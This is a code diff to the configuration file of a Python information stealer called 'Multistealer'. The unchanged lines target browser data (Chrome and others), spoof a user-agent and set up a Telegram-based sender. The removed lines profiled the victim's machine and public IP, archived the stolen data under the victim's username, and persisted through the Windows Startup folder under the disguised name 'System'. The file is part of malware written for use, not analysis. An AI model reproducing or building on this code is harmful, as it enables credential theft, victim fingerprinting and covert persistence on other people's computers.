@@ -1,11 +1,7 @@
 from enum import Enum
-from getpass import getuser
 from os import environ
 
-sys_root = environ.get("SystemRoot", r"C:\Windows")
 user_profile = environ.get("USERPROFILE")
-user = getuser()
-user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
 
 
 class Browsers(Enum):
@@ -23,7 +19,6 @@ class ChromiumConfig:
 
 class MultistealerConfig:
     PoolSize = 5
-    ZipName = f"{user}-st"
 
     BrowsersData = {
         Browsers.CHROME: {
@@ -49,21 +44,8 @@ class MultistealerConfig:
     }
 
 
-class SystemConfig:
-    User = user
-    IPUrl = "https://ipinfo.io/json"
-    SystemData = "User: {0}\nIP: {1}\nMachine Type: {2}\nOS Name: {3}\nMachine Name on Network: {4}\nMonitor: {5}\nCPU: {6}\nGPU: {7}\nRAM:\n{8}\nDrives:\n{9}"
-
-
 class SenderConfig:
-    UserAgent = user_agent
-
-
-class AutostartConfig:
-    AutostartName = "System"
-    AutostartPath = (
-        rf"{user_profile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-    )
+    UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
 
 
 class TelegramConfig:
